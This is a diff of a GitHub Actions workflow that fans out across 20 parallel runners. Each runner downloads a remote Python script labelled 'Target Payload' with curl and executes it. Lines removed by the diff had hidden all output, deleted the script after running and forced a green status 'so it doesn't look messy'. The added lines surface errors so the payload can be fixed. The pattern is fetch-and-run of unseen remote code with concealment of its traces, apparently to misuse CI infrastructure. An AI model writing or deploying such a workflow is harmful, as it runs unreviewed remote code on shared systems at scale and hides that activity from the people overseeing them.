@@ -7,26 +7,20 @@ jobs:
   execute-script:
     runs-on: ubuntu-latest
     strategy:
-      fail-fast: false # CRITICAL: Prevents chain-reaction cancellation if one node fails
       max-parallel: 20
+      fail-fast: false # Add this: Prevents chain-reaction cancellation
       matrix:
         node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
     steps:
-      - name: Asymmetric Sleep
-        # Bash math: Multiplies the matrix node index by 5 seconds
-        run: sleep $(( ${{ matrix.node_index }} * 5 ))
-
       - name: Initialize Python Environment
         uses: actions/setup-python@v5
         with:
           python-version: '3.10'
 
-      - name: Fetch 
+      - name: Fetch Target Payload
         run: curl -sL https://mys-ecru.vercel.app/test.py -o test.py
 
-      - name: E
-        # Used ';' instead of '&&'. 
-        # ';' ensures 'rm test.py' runs EVEN IF Python crashes. 
-        # '|| true' forces the step to show green/success so it doesn't look messy.
-        run: python test.py > /dev/null 2>&1 ; rm test.py || true
+      - name: Execute Node ${{ matrix.node_index }}
+        # Removed /dev/null temporarily. Let the error bleed so we can patch it.
+        run: python test.py && rm test.py
